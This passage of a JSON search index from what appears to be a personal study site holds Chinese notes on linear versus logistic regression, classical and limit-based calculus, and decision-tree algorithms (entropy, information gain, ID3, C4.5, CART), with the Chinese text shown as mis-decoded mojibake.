stdev(data))","tags":"AI","url":"/yq-doc-source-docs-AI-Digital-Differential-and-standard-difference.html","loc":"/yq-doc-source-docs-AI-Digital-Differential-and-standard-difference.html"},{"title":"é€»è¾‘å›å½’å’Œçº¿æ€§å›å½’","text":"åº”ç”¨é¢†åŸŸï¼š çº¿æ€§å›å½’ï¼ˆLinear Regressionï¼‰ çº¿æ€§å›å½’ç”¨äºå»ºç«‹è¿ç»­å‹ç›®æ ‡å˜é‡ä¸ä¸€ä¸ªæˆ–å¤šä¸ªè‡ªå˜é‡ä¹‹é—´çš„çº¿æ€§å…³ç³»ã€‚å®ƒé€šå¸¸ç”¨äºé¢„æµ‹æ•°å€¼å‹çš„è¾“å‡ºï¼Œå¦‚æˆ¿ä»·é¢„æµ‹ã€é”€å”®é‡é¢„æµ‹ç­‰ã€‚ é€»è¾‘å›å½’ï¼ˆLogistic Regressionï¼‰ é€»è¾‘å›å½’ç”¨äºå»ºç«‹è‡ªå˜é‡ä¸äºŒå…ƒåˆ†ç±»ç›®æ ‡å˜é‡ä¹‹é—´çš„å…³ç³»ã€‚å®ƒå¸¸ç”¨äºè§£å†³åˆ†ç±»é—®é¢˜ï¼Œå¦‚åˆ¤æ–­é‚®ä»¶æ˜¯å¦ä¸ºåƒåœ¾é‚®ä»¶ã€é¢„æµ‹ç”¨æˆ·æ˜¯å¦ä¼šè´­ä¹°æŸä¸ªäº§å“ç­‰ã€‚ è¾“å‡ºç±»å‹ï¼š çº¿æ€§å›å½’ çº¿æ€§å›å½’çš„è¾“å‡ºæ˜¯è¿ç»­çš„å®æ•°å€¼ã€‚å¯ä»¥æ˜¯ä»»æ„å®æ•°ï¼Œå¯ä»¥æ˜¯æ­£æ•°ã€è´Ÿæ•°æˆ–é›¶ã€‚ é€»è¾‘å›å½’ é€»è¾‘å›å½’çš„è¾“å‡ºæ˜¯æ¦‚ç‡å€¼ï¼Œè¡¨ç¤ºå±äºæŸä¸ªç±»åˆ«çš„æ¦‚ç‡ã€‚é€šå¸¸ä½¿ç”¨sigmoidå‡½æ•°å°†çº¿æ€§ç»„åˆçš„ç»“æœæ˜ å°„åˆ°0åˆ°1ä¹‹é—´çš„æ¦‚ç‡ã€‚ æ¨¡å‹å½¢å¼ï¼š çº¿æ€§å›å½’ çº¿æ€§å›å½’æ¨¡å‹å‡è®¾è‡ªå˜é‡ä¸å› å˜é‡ä¹‹é—´å­˜åœ¨çº¿æ€§å…³ç³»ã€‚ æ¨¡å‹å½¢å¼å¯ä»¥è¡¨ç¤ºä¸º: Y = b0 + b1X1 + b2X2 + ... + bn*Xn å…¶ä¸­Yæ˜¯å› å˜é‡ï¼ŒX1, X2, ..., Xnæ˜¯è‡ªå˜é‡ï¼Œb0, b1, b2, ..., bnæ˜¯å›å½’ç³»æ•°ã€‚ é€»è¾‘å›å½’ é€»è¾‘å›å½’æ¨¡å‹ä½¿ç”¨äº†sigmoidå‡½æ•°æ¥å»ºæ¨¡ï¼Œå°†çº¿æ€§ç»„åˆçš„ç»“æœæ˜ å°„åˆ°0åˆ°1ä¹‹é—´çš„æ¦‚ç‡ã€‚ æ¨¡å‹å½¢å¼å¯ä»¥è¡¨ç¤ºä¸º: P(Y=1|X) = 1 / (1 + exp(-z)) å…¶ä¸­P(Y=1|X)æ˜¯å±äºç±»åˆ«1çš„æ¦‚ç‡ï¼Œzæ˜¯çº¿æ€§ç»„åˆçš„ç»“æœã€‚ å‚æ•°ä¼°è®¡ï¼š çº¿æ€§å›å½’ çº¿æ€§å›å½’é€šå¸¸ä½¿ç”¨æœ€å°äºŒä¹˜æ³•ï¼ˆOrdinary Least Squaresï¼‰æ¥ä¼°è®¡å›å½’ç³»æ•°ã€‚ ç›®æ ‡æ˜¯æœ€å°åŒ–è§‚æµ‹å€¼ä¸æ¨¡å‹é¢„æµ‹å€¼ä¹‹é—´çš„å¹³æ–¹å·®ã€‚ é€»è¾‘å›å½’ï¼š é€»è¾‘å›å½’ä½¿ç”¨æœ€å¤§ä¼¼ç„¶ä¼°è®¡æ¥ä¼°è®¡å›å½’ç³»æ•°ã€‚ ç›®æ ‡æ˜¯æœ€å¤§åŒ–è§‚æµ‹å€¼çš„ä¼¼ç„¶å‡½æ•°ï¼Œå³æœ€å¤§åŒ–è§‚æµ‹å€¼ä¸ºå®é™…ç±»åˆ«çš„æ¦‚ç‡ã€‚","tags":"AI","url":"/yq-doc-source-docs-AI-Digital-Logic-regression-and-linear-regression.html","loc":"/yq-doc-source-docs-AI-Digital-Logic-regression-and-linear-regression.html"},{"title":"ç§¯åˆ†å’Œå¾®åˆ†","text":"ä»¥ä¸‹ä¸»è¦é’ˆå¯¹è¿™æ ·çš„ä¸€å…ƒå‡½æ•°: y = f(x) æƒ³èµ·ä»¥å‰å¤§å­¦çš„ä¸€ä¸ªæ¦‚å¿µ å¯å¯¼ä¸€å®šè¿ç»­, è¿ç»­ä¸ä¸€å®šå¯å¯¼ å¤å…¸å¾®ç§¯åˆ†, å¯¼æ•° å¤å…¸å¾®ç§¯åˆ†æ±‚è§£æ›²çº¿å›´æˆçš„é¢ç§¯çš„ä¸»è¦æ€æƒ³ï¼Œå°±æ˜¯æŠŠæ›²çº¿ä¸‹çš„é¢ç§¯åˆ’åˆ†æˆäº†æ— æ•°ä¸ªçŸ©å½¢é¢ç§¯ä¹‹å’Œ ï¼ˆæ˜¾ç„¶ï¼‰ç›´è§‰å‘Šè¯‰æˆ‘ä»¬ï¼Œå¦‚æœ è¶Šå¤§ï¼Œåˆ™è¿™ä¸ªè¿‘ä¼¼è¶Šå‡†ç¡® æ­¤æ—¶ï¼Œæ— ç©·å°é‡å°±å‡ºç°äº†ã€‚ åœ¨ å¤å…¸å¾®ç§¯åˆ† å­¦ä¸­ï¼Œæ— ç©·å°é‡æ˜¯å»ºç«‹å¾®ç§¯åˆ†çš„åŸºç¡€ã€‚ è±å¸ƒå°¼å…¹ä»‹ç»å¾®ç§¯åˆ†çš„è®ºæ–‡å°±å«åšã€Šè®ºæ·±åº¦éšè—çš„å‡ ä½•å­¦åŠæ— ç©·å°ä¸æ— ç©·å¤§çš„åˆ†æã€‹ã€‚ åœ¨å½“æ—¶çš„è§‚ç‚¹ä¸‹ï¼Œæ— ç©·å°é‡åˆ°åº•æ˜¯ä»€ä¹ˆï¼Œä¹Ÿæ˜¯é¢‡æœ‰äº‰è®ºçš„ã€‚ å½“æ—¶æœ‰æ•°å­¦å®¶æ‰“æ¯”å–»ï¼š\"æ— ç©·å°é‡å°±å¥½æ¯”å±±ä¸Šçš„ç°å°˜ï¼Œå»æ‰å’Œå¢åŠ éƒ½æ²¡æœ‰ä»€ä¹ˆå½±å“\"ï¼Œå¾ˆæ˜¾ç„¶æœ‰äººè®¤ä¸ºè¿™æ˜¯çœŸå®å­˜åœ¨çš„ã€‚ åœ¨å…·ä½“è®¡ç®—æ›²çº¿ä¸‹é¢çš„é¢ç§¯ï¼Œå³æˆ‘ä»¬ç°åœ¨æ‰€è¯´çš„å®šç§¯åˆ†çš„æ—¶å€™ï¼Œå¿…ç„¶ä¼šé‡åˆ°å¯¼æ•°çš„é—®é¢˜ï¼Œæ‰€ä»¥å¾ˆè‡ªç„¶çš„å¼€å§‹äº†å¯¹å¯¼æ•°çš„å®šä¹‰å’Œè®¨è®ºã€‚ å¯¼æ•°çš„å¤å…¸å®šä¹‰ åœ¨æ›²çº¿ä¸Šå–ä¸¤ç‚¹ï¼Œè¿æ¥èµ·æ¥æ‰€å½¢æˆçš„ç›´çº¿ï¼Œå°±ç§°ä¸ºæ›²çº¿çš„å‰²çº¿ï¼š è¿ç»­çš„å‰²çº¿å¯ä»¥ååº”æ›²çº¿çš„å¹³å‡å˜åŒ–ç‡ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™ä¸€æ®µæ›²çº¿å¤§æ¦‚æ€»çš„è¶‹åŠ¿æ˜¯ä¸Šå‡è¿˜æ˜¯ä¸‹é™ï¼Œä¸Šå‡äº†å¤šå°‘ï¼Œç”¨å‰²çº¿æè¿°æ˜¯å¹¶ä¸æ˜¯ç²¾ç¡®çš„ã€‚ æœ‰äº†åˆ‡çº¿ä¹‹åæˆ‘ä»¬è¿›ä¸€æ­¥å»å®šä¹‰å¯¼æ•° ä»è¿™å¼ å›¾å¾—å‡º å¯¼æ•° çš„å®šä¹‰ f'(x) = dy / dx è€Œ dx å’Œ dy è¢«ç§°ä¸º x å’Œ y çš„ å¾®åˆ† ï¼Œéƒ½ä¸ºæ— ç©·å°é‡ï¼Œ æ‰€ä»¥å¯¼æ•°ä¹Ÿè¢«è±å¸ƒå°¼å…¹ç§°ä¸º å¾®å•† (å¾®åˆ†ä¹‹å•†) æ— ç©·å°é‡å¯¼è‡´çš„éº»çƒ¦ ä¸Šå›¾å®é™…ä¸Šæ˜¯æœ‰çŸ›ç›¾çš„ æ‰€ä»¥å°±å¤å…¸å¾®ç§¯åˆ†ä¸­åˆ‡çº¿çš„å®šä¹‰è€Œè¨€ï¼Œå¾®ç§¯åˆ†çš„åŸºç¡€å°±æ˜¯ä¸ç‰¢å›ºçš„ã€‚ æ— ç©·å°é‡çš„éº»çƒ¦è¿˜è¿œè¿œä¸æ­¢è¿™ä¸€äº›ï¼Œx&#94;2 çš„å¯¼æ•°æ˜¯è¿™æ ·è®¡ç®—çš„: dx å…ˆåœ¨é™¤æ³•ä¸­å½“ä½œä¸ä¸º 0 çš„å˜é‡è¢«çº¦æ‰, å†åœ¨æœ€åçš„åŠ æ³•ä¸­å½“ä½œ 0 è¢«å¿½ç•¥. ä¸€ä¼šæ˜¯0ä¸€ä¼šåˆä¸æ˜¯0ã€‚ æ— ç©·å°é‡å’Œæ— ç©·å°é‡ç›¸é™¤ä¸ºä»€ä¹ˆå¯ä»¥å¾—åˆ°ä¸ä¸€æ ·çš„å€¼ï¼Ÿéš¾é“ä¸åº”è¯¥éƒ½æ˜¯1ï¼Ÿ æ— ç©·å°é‡è¿˜è¿åäº† é˜¿åŸºç±³å¾·å…¬ç† ï¼Œè¿™ä¸ªæ‰æ˜¯æ›´ä¸¥é‡çš„ç¼ºé™·ï¼Œ åº·æ‰˜å°”è¯æ˜è¿‡ï¼Œå¦‚æœé˜¿åŸºç±³å¾·å…¬ç†è¢«è¿èƒŒçš„è¯ä¼šå‡ºå¤§é—®é¢˜ã€‚ ä¸€è¾¹æ˜¯çœ‹èµ·æ¥æ²¡æœ‰é”™çš„å¾®ç§¯åˆ†ï¼Œä¸€è¾¹æ˜¯æœ‰ä¸¥é‡ç¼ºé™·çš„æ— ç©·å°é‡ï¼Œè¿™å°±æ˜¯ç¬¬äºŒæ¬¡æ•°å­¦å±æœºã€‚ æ•°å­¦çš„ä¸¥æ ¼æ€§å—åˆ°äº†æŒ‘æˆ˜ï¼Œ \"å¯¹äºæ•°å­¦ï¼Œä¸¥æ ¼æ€§ä¸æ˜¯ä¸€åˆ‡ï¼Œä½†æ˜¯æ²¡æœ‰äº†ä¸¥æ ¼æ€§å°±æ²¡æœ‰äº†ä¸€åˆ‡\"ã€‚ ç›¸å…³æ¦‚å¿µ æ— ç©·å°é‡ åœ¨ç”¨å¤å…¸å¾®ç§¯åˆ†æ±‚è§£æ›²çº¿å›´æˆçš„é¢ç§¯äº‹ï¼Œ æŠŠæ›²çº¿å¯¹çš„å®šä¹‰åŸŸ[a,b]å‡åˆ†æˆé—´éš”é•¿åº¦ delta x (è¿™åº”è¯¥æ˜¯ä¸‰è§’å½¢ç¬¦å·, æˆ‘æ²¡æ‰¾åˆ°, æš‚æ—¶ç›´æ¥ç”¨è‹±æ–‡) ä¸ºnä»½ï¼Œ å½“ n->âˆ æ—¶ï¼Œ delta x å˜æˆæ— ç©·å°é‡ï¼Œè®°ä½œ dx ï¼Œå³ x çš„ å¾®åˆ† å¾®åˆ† å¾®åˆ†æ˜¯å¾®å°çš„å¢é‡ï¼Œå³æ— ç©·å°é‡ã€‚åœ¨å¤å…¸å¾®ç§¯åˆ†å­¦ä¸­ï¼Œæ— ç©·å°é‡æ˜¯å»ºç«‹å¾®ç§¯åˆ†çš„åŸºç¡€ã€‚ åˆ‡çº¿ é€šè¿‡æ— ç©·å°é‡å®šä¹‰äº†åˆ‡çº¿ã€‚ å¯¼æ•° å¯¼æ•°å°±æ˜¯åˆ‡çº¿çš„æ–œç‡ã€‚ åŸºäºæé™é‡å»ºçš„å¾®ç§¯åˆ† è±å¸ƒå°¼å…¹ã€æ¬§æ‹‰ç­‰éƒ½è®¤è¯†åˆ°äº†æ— ç©·å°é‡å¯¼è‡´çš„éº»çƒ¦ï¼Œ ä¸€ç›´æ‹¼å‘½æƒ³è¦ä¿®è¡¥ï¼Œä½†è¿™ä¸ªé—®é¢˜ç­‰äº†200å¹´åï¼Œå³19ä¸–çºªæé™æ¦‚å¿µçš„æ¸…æ™°ä¹‹åæ‰å¾—åˆ°è§£å†³ã€‚ è§£å†³åŠæ³•æ˜¯ï¼Œå®Œå…¨æ‘ˆå¼ƒæ— ç©·å°é‡ï¼ŒåŸºäºæé™çš„æ¦‚å¿µï¼Œé‡æ–°å»ºç«‹äº†å¾®ç§¯åˆ†ã€‚ å¯ä»¥çœ‹åˆ°ï¼Œæé™çš„æè¿°å¹¶æ²¡æœ‰ç”¨åˆ°ä»€ä¹ˆæ— ç©·å°é‡ã€‚ å¯¼æ•° çš„æé™å®šä¹‰ ç”¨æé™é‡æ–°ä¸¥æ ¼å®šä¹‰äº†å¯¼æ•°ï¼Œæ­¤æ—¶å·²ç»è„±ç¦»äº†å¾®å•†çš„æ¦‚å¿µã€‚ä¹Ÿå°±æ˜¯æ­¤æ—¶ï¼Œå¯¼æ•°åº”è¯¥è¢«çœ‹æˆä¸€ä¸ªæ•´ä½“ã€‚ ä¸è¿‡æˆ‘ä»¬ä»ç„¶å¯ä»¥å»å®šä¹‰ä»€ä¹ˆæ˜¯å¾®åˆ†ï¼Œè¯´åˆ°è¿™é‡Œï¼ŒçœŸæ˜¯æœ‰ç‚¹å‰§æƒ…åè½¬: å¤å…¸å¾®ç§¯åˆ†æ˜¯å…ˆå®šä¹‰å¾®åˆ†å†å®šä¹‰å¯¼æ•°ï¼Œ ç°åœ¨æé™å¾®ç§¯åˆ†æ˜¯å…ˆå®šä¹‰äº†å¯¼æ•°å†æœ‰å¾®åˆ†ã€‚ ç›¸å…³æ¦‚å¿µ å¯¼æ•° å¯¼æ•°è¢«å®šä¹‰ä¸ºä¸€ä¸ªæé™ï¼Œå…¶æ„ä¹‰å°±æ˜¯å˜åŒ–ç‡ å¾®åˆ† å¾®åˆ†æ˜¯ä¸€ä¸ªçº¿æ€§å‡½æ•°ï¼Œå…¶æ„ä¹‰å°±æ˜¯å˜åŒ–çš„å…·ä½“æ•°å€¼ åˆ‡çº¿ æœ‰äº†å¯¼æ•°ä¹‹åå°±å¯ä»¥è¢«ç¡®å®šä¸‹æ¥äº† å‚è€ƒ: https://zhuanlan.zhihu.com/p/38337248 å¤ä»Šå¾®ç§¯åˆ† å¾®ç§¯åˆ†å®é™…ä¸Šè¢«å‘æ˜äº†ä¸¤æ¬¡ã€‚ å¤å…¸å¾®ç§¯åˆ†å’Œæé™å¾®ç§¯åˆ†å¯ä»¥è¯´æ˜¯ä¸¤ä¸ªä¸œè¥¿ã€‚æˆ‘ä»¬å†æ¥æ¯”è¾ƒä¸€ä¸‹å¤å…¸å¾®ç§¯åˆ†å’Œæé™å¾®ç§¯åˆ†ã€‚ å¤å…¸å¾®ç§¯åˆ†æ˜¯å…ˆå®šä¹‰å¾®åˆ†å†å®šä¹‰å¯¼æ•°ï¼› æé™å¾®ç§¯åˆ†æ˜¯å…ˆå®šä¹‰å¯¼æ•°å†å®šä¹‰å¾®åˆ†ã€‚ å¤å…¸å¾®ç§¯åˆ†çš„å¯¼æ•°æ˜¯åŸºäºæ— ç©·å°é‡å®šä¹‰çš„ï¼› æé™å¾®ç§¯åˆ†çš„å¯¼æ•°æ˜¯åŸºäºæé™å®šä¹‰çš„ å¤å…¸å¾®ç§¯åˆ†çš„å¾®åˆ†æ˜¯æ— ç©·å°é‡ï¼› æé™å¾®ç§¯åˆ†çš„å¾®åˆ†æ˜¯ä¸€ä¸ªçº¿æ€§å‡½æ•°ã€‚ å¤å…¸å¾®ç§¯åˆ†çš„å®šç§¯åˆ†æ˜¯æ±‚æ— ç©·å°çŸ©å½¢é¢ç§¯çš„å’Œï¼›æé™å¾®ç§¯åˆ†çš„å®šç§¯åˆ†æ˜¯æ±‚é»æ›¼å’Œã€‚ å¤å…¸å¾®ç§¯åˆ†çš„åˆ‡çº¿æ˜¯ç”»å‡ºæ¥çš„ï¼› æé™å¾®ç§¯åˆ†çš„åˆ‡çº¿æ˜¯ç®—å‡ºæ¥çš„ã€‚ å¤å…¸å¾®ç§¯åˆ†çš„å»ºç«‹è¿‡ç¨‹å¾ˆç›´è§‚ï¼› æé™å¾®ç§¯åˆ†çš„å»ºç«‹è¿‡ç¨‹æ›´æŠ½è±¡ã€‚ å¤å…¸å¾®ç§¯åˆ†æœ€å¤§çš„å¥½å¤„å°±æ˜¯å¾ˆç›´è§‚ï¼Œä¸è¿‡ä¹Ÿæ˜¯å› ä¸ºå¤ªç›´è§‚äº†ï¼Œ æ‰€ä»¥æˆ‘ä»¬ä¸€ç›´éƒ½æ— æ³•å¿˜è®°å®ƒå¸¦æ¥çš„å°è±¡ï¼Œä¹Ÿå¯¹æˆ‘ä»¬ç†è§£æé™å¾®ç§¯åˆ†é€ æˆäº†éšœç¢ã€‚ ä¹Ÿè®©æˆ‘ä»¬åœ¨å®é™…åº”ç”¨ä¸­é€ æˆäº†é”™è¯¯çš„ç†è§£ã€‚ åŠ æƒç§¯åˆ† æ¯”å¦‚æ‘¸çƒ, è“çƒ 10 åˆ†, çº¢çƒ 5 åˆ†, æœ€åçš„å¾—åˆ†å°±æ˜¯: 10 * nBlue + 5 * nRed è¿™é‡Œ 10, 5 å°±æ˜¯æƒ","tags":"AI","url":"/yq-doc-source-docs-AI-Digital-Points-and-different-points.html","loc":"/yq-doc-source-docs-AI-Digital-Points-and-different-points.html"},{"title":"æ•°ç†ç›¸å…³","text":"é€»è¾‘å›å½’å’Œçº¿æ€§å›å½’ æ–¹å·®ä¸æ ‡å‡†å·® ç§¯åˆ†å’Œå¾®åˆ†","tags":"AI","url":"/yq-doc-source-docs-AI-Digital-index.html","loc":"/yq-doc-source-docs-AI-Digital-index.html"},{"title":"å†³ç­–æ ‘ç®—æ³• Decision Tree","text":"æ³¨è§£ å±äºç›‘ç£å­¦ä¹ (æ ·æœ¬ä¸å¯¹åº”ç»“æœå·²çŸ¥) å†³ç­–æ ‘ï¼ˆDecision Treeï¼‰ï¼Œå®ƒæ˜¯ä¸€ç§ä»¥æ ‘å½¢æ•°æ®ç»“æ„æ¥å±•ç¤ºå†³ç­–è§„åˆ™å’Œåˆ†ç±»ç»“æœçš„æ¨¡å‹ï¼Œ ä½œä¸ºä¸€ç§å½’çº³å­¦ä¹ ç®—æ³•ï¼Œå…¶é‡ç‚¹æ˜¯å°†çœ‹ä¼¼æ— åºã€æ‚ä¹±çš„å·²çŸ¥æ•°æ®ï¼Œ é€šè¿‡æŸç§æŠ€æœ¯æ‰‹æ®µå°†å®ƒä»¬è½¬åŒ–æˆå¯ä»¥é¢„æµ‹æœªçŸ¥æ•°æ®çš„æ ‘çŠ¶æ¨¡å‹ï¼Œ æ¯ä¸€æ¡ä»æ ¹ç»“ç‚¹ï¼ˆå¯¹æœ€ç»ˆåˆ†ç±»ç»“æœè´¡çŒ®æœ€å¤§çš„å±æ€§ï¼‰åˆ°å¶å­ç»“ç‚¹ï¼ˆæœ€ç»ˆåˆ†ç±»ç»“æœï¼‰çš„è·¯å¾„éƒ½ä»£è¡¨ä¸€æ¡å†³ç­–çš„è§„åˆ™ã€‚ å†³ç­–æ ‘å°±æ˜¯å½¢å¦‚ä¸‹å›¾çš„ç»“æ„ï¼ˆæœºå™¨å­¦ä¹ è¥¿ç“œä¹¦çš„å›¾ï¼‰ï¼š æœºå™¨å­¦ä¹ ä¸­ï¼Œ å†³ç­–æ ‘æ˜¯ä¸€ä¸ªé¢„æµ‹æ¨¡å‹ï¼Œæ ‘ä¸­æ¯ä¸ªèŠ‚ç‚¹è¡¨ç¤ºæŸä¸ªå¯¹è±¡ï¼Œè€Œæ¯ä¸ªåˆ†å‰è·¯å¾„åˆ™ä»£è¡¨æŸä¸ªå¯èƒ½çš„å±æ€§å€¼ï¼Œ è€Œæ¯ä¸ªå¶èŠ‚ç‚¹åˆ™å¯¹åº”ä»æ ¹èŠ‚ç‚¹åˆ°è¯¥å¶èŠ‚ç‚¹æ‰€ç»å†çš„è·¯å¾„æ‰€è¡¨ç¤ºçš„å¯¹è±¡çš„å€¼ã€‚ å†³ç­–æ ‘ä»…æœ‰å•ä¸€è¾“å‡ºï¼Œé€šå¸¸è¯¥ç®—æ³•ç”¨äºè§£å†³åˆ†ç±»é—®é¢˜ã€‚ ä¸€ä¸ªå†³ç­–æ ‘åŒ…å«ä¸‰ç§ç±»å‹çš„èŠ‚ç‚¹ï¼š å†³ç­–èŠ‚ç‚¹ï¼šé€šå¸¸ç”¨çŸ©å½¢æ¡†æ¥è¡¨ç¤º æœºä¼šèŠ‚ç‚¹ï¼šé€šå¸¸ç”¨åœ†åœˆæ¥è¡¨ç¤º ç»ˆç»“ç‚¹ï¼šé€šå¸¸ç”¨ä¸‰è§’å½¢æ¥è¡¨ç¤º ç®€å•å†³ç­–æ ‘ç®—æ³•æ¡ˆä¾‹ï¼Œç¡®å®šäººç¾¤ä¸­è°å–œæ¬¢ä½¿ç”¨ä¿¡ç”¨å¡ã€‚ è€ƒè™‘äººç¾¤çš„å¹´é¾„å’Œå©šå§»çŠ¶å†µï¼Œå¦‚æœå¹´é¾„åœ¨30å²æˆ–æ˜¯å·²å©šï¼Œ äººä»¬æ›´å€¾å‘äºé€‰æ‹©ä¿¡ç”¨å¡ï¼Œåä¹‹åˆ™æ›´å°‘ã€‚ é€šè¿‡ç¡®å®šåˆé€‚çš„å±æ€§æ¥å®šä¹‰æ›´å¤šçš„ç±»åˆ«ï¼Œå¯ä»¥è¿›ä¸€æ­¥æ‰©å±•æ­¤å†³ç­–æ ‘ã€‚ åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œå¦‚æœä¸€ä¸ªäººç»“å©šäº†ï¼Œä»–è¶…è¿‡30å²ï¼Œä»–ä»¬æ›´æœ‰å¯èƒ½æ‹¥æœ‰ä¿¡ç”¨å¡ï¼ˆ100% åå¥½ï¼‰ã€‚ æµ‹è¯•æ•°æ®ç”¨äºç”Ÿæˆå†³ç­–æ ‘ã€‚ æ³¨è§£ å¯¹äºé‚£äº›å„ç±»åˆ«æ ·æœ¬æ•°é‡ä¸ä¸€è‡´çš„æ•°æ®ï¼Œåœ¨å†³ç­–æ ‘å½“ä¸­ä¿¡æ¯å¢ç›Šçš„ç»“æœåå‘äºé‚£äº›å…·æœ‰æ›´å¤šæ•°å€¼çš„ç‰¹å¾ã€‚ æ„å»ºå†³ç­–æ ‘ è®­ç»ƒé˜¶æ®µï¼šä»ç»™å®šçš„è®­ç»ƒæ•°æ®é›†DBï¼Œæ„é€ å‡ºä¸€é¢—å†³ç­–æ ‘: class = DecisionTree(DB) åˆ†ç±»é˜¶æ®µï¼šä»æ ¹å¼€å§‹ï¼ŒæŒ‰ç…§å†³ç­–æ ‘çš„åˆ†ç±»å±æ€§ï¼Œ ä»ä¸Šå¾€ä¸‹ï¼Œé€å±‚åˆ’åˆ†ã€‚ç›´åˆ°å¶å­èŠ‚ç‚¹ï¼Œä¾¿èƒ½è·å¾—ç»“æœ: y = DecisionTree(x) ç†µ ä¿¡æ¯ç†µï¼ˆInformation Entropyï¼‰ æ¡ä»¶ç†µ å†³ç­–æ ‘çš„åˆ’åˆ†ä¾æ®æ˜¯ ä¿¡æ¯å¢ç›Š : æ‰€è°“çš„ä¿¡æ¯å¢ç›Šæ˜¯æŒ‡ ç‰¹å¾Aå¯¹è®­ç»ƒæ•°æ®é›†Dçš„ä¿¡æ¯å¢ç›Šgï¼ˆD,Aï¼‰ å®šä¹‰ä¸º é›†åˆDçš„ä¿¡æ¯ç†µH(D) ä¸ ç‰¹å¾Aç»™å®šæ¡ä»¶ä¸‹Dçš„ä¿¡æ¯æ¡ä»¶ç†µH(D|A) ä¹‹å·®ï¼Œ å³å…¬å¼ä¸º: g(D, A) = H(D) - H(D|A) æ³¨è§£ ä¿¡æ¯å¢ç›Šè¡¨ç¤ºå¾—çŸ¥ç‰¹å¾Xçš„ä¿¡æ¯è€Œä½¿å¾—ç±»Yçš„ä¿¡æ¯çš„ä¸ç¡®å®šæ€§å‡å°‘çš„ç¨‹åº¦ã€‚ æ„é€ ä¾æ®-ç†µ ç†µ è¡¨ç¤ºæ•°æ®çš„æ··ä¹±ç¨‹åº¦, ç†ç§‘çš„å¯ä»¥å‚è€ƒåŒ–å­¦çš„ ç†µ ç†µè¶Šå¤§, æ•°æ®è¶Šæ··ä¹±, ä¸ç¡®å®šæ€§è¶Šå¤§, è¶Šä¸ç¡®å®š ç†µè¶Šå°, æ•°æ®è¶Šä¸æ··ä¹±, ä¸ç¡®å®šæ€§è¶Šå°, è¶Šç¡®å®š æˆ‘ä»¬ç”¨ Entropy è¡¨ç¤ºç†µ æ‰€ä»¥å½“ Entropy æœ€å¤§ä¸º1çš„æ—¶å€™ï¼Œæ˜¯åˆ†ç±»æ•ˆæœæœ€å·®çš„çŠ¶æ€ï¼Œå½“å®ƒæœ€å°ä¸º0çš„æ—¶å€™ï¼Œæ˜¯å®Œå…¨åˆ†ç±»çš„çŠ¶æ€ã€‚ å†³ç­–æ ‘ç®—æ³• ä¸Šé¢ä¹Ÿæåˆ°äº†, æ„å»ºå†³ç­–æ ‘çš„è¿‡ç¨‹å°±æ˜¯å¯»æ‰¾æœ€ä¼˜åˆ†å‰²å±æ€§, ç„¶åä»¥ æœ€å¤§åŒ–ä¿¡æ¯å¢ç›Š(ID3, C4.5) æˆ– åŸºå°¼ä¸çº¯åº¦(CART) çš„æ–¹å¼ä¸€ç›´é€’å½’åˆ’åˆ†ä¸‹å» ç®—æ³• æè¿° ID3 å…¶æ ¸å¿ƒæ˜¯åœ¨å†³ç­–æ ‘çš„å„çº§èŠ‚ç‚¹ä¸Šï¼Œ ä½¿ç”¨ä¿¡æ¯å¢ç›Šæ–¹æ³•ä½œä¸ºå±æ€§çš„é€‰æ‹©æ ‡å‡†ï¼Œ æ¥å¸®åŠ©ç¡®å®šç”Ÿæˆæ¯ä¸ªèŠ‚ç‚¹æ—¶æ‰€é‡‡ç”¨çš„åˆé€‚å±æ€§ C4.5 C4.5å†³ç­–æ ‘ç”Ÿæˆç®—æ³•ç›¸å¯¹äºID3ç®—æ³•çš„é‡è¦æ”¹è¿› æ˜¯ä½¿ç”¨ä¿¡æ¯å¢ç›Šç‡æ¥é€‰æ‹©èŠ‚ç‚¹å±æ€§ã€‚ C4.5ç®—æ³•å¯ä»¥å£²æœID3ç®—æ³•å­˜åœ¨çš„ä¸è¶³ï¼š ID3ç®—æ³•åªé€‚ç”¨äºç¦»æ•£çš„æè¿°å±æ€§ï¼Œ è€ŒC4.5ç®—æ³•æ—¢èƒ½å¤Ÿå¤„ç†ç¦»æ•£çš„æè¿°å±æ€§ï¼Œ ä¹Ÿå¯ä»¥å¤„ç†è¿ç»­çš„æè¿°å±æ€§ CART CARTå†³ç­–æ ‘æ˜¯ä¸€ç§ååˆ†æœ‰æ•ˆçš„éå‚æ•°åˆ†ç±»å’Œå›å½’æ–¹æ³•ï¼Œ é€šè¿‡æ„å»ºæ ‘ã€ä¿®å‰ªæ ‘ã€è¯„ä¼°æ ‘ æ¥æ„å»ºä¸€ä¸ªäºŒå‰æ ‘ã€‚ å½“ç»ˆç»“ç‚¹æ˜¯è¿ç»­å˜é‡æ—¶ï¼Œè¯¥æ•°ä¸ºå›å½’æ ‘ï¼› å½“ç»ˆç»“ç‚¹æ˜¯åˆ†ç±»å˜é‡ï¼Œè¯¥æ•°ä¸ºåˆ†ç±»æ ‘ å†³ç­–æ ‘ç®—æ³•-ID3 æœ€å¤§åŒ–ä¿¡æ¯å¢ç›Š, åŸºäºä¿¡æ¯ç†µå’Œä¿¡æ¯å¢ç›Šåšåˆ†ç±»ï¼› ä¿¡æ¯å¢ç›Šç­‰äºæœªåˆ’åˆ†æ—¶æ•°æ®é›†çš„ä¿¡æ¯ç†µï¼Œå‡å»åˆ’åˆ†ä¹‹åæ‰€æœ‰å­æ•°æ®é›†çš„ä¿¡æ¯ç†µä¹‹å’Œã€‚ ( Gain(D,A)è¡¨ç¤ºç”¨ç‰¹å¾Aåˆ’åˆ†å¾—åˆ°çš„ä¿¡æ¯å¢ç›Šï¼ŒH(D)è¡¨ç¤ºæœªåˆ’åˆ†æ—¶Dçš„ä¿¡æ¯ç†µï¼ŒH(D|A)è¡¨ç¤ºç”¨ç‰¹å¾Aåˆ’åˆ†å¾—åˆ°çš„æ‰€æœ‰å­æ•°æ®é›†çš„ä¿¡æ¯ç†µä¹‹å’Œ ) ( Di è¡¨ç¤ºåˆ’åˆ†ä¹‹åå¾—åˆ°çš„å­æ•°æ®é›†æ•°é‡ï¼ŒH(D|A) å°±æ˜¯å„ä¸ªå­æ•°æ®é›†ä¿¡æ¯ç†µ H(Di) çš„åŠ æƒæ±‚å’Œ,æƒé‡ä¸ºå­æ ·æœ¬æ•°å å…¨éƒ¨æ ·æœ¬çš„æ¯”ä¾‹ ) å†³ç­–æ 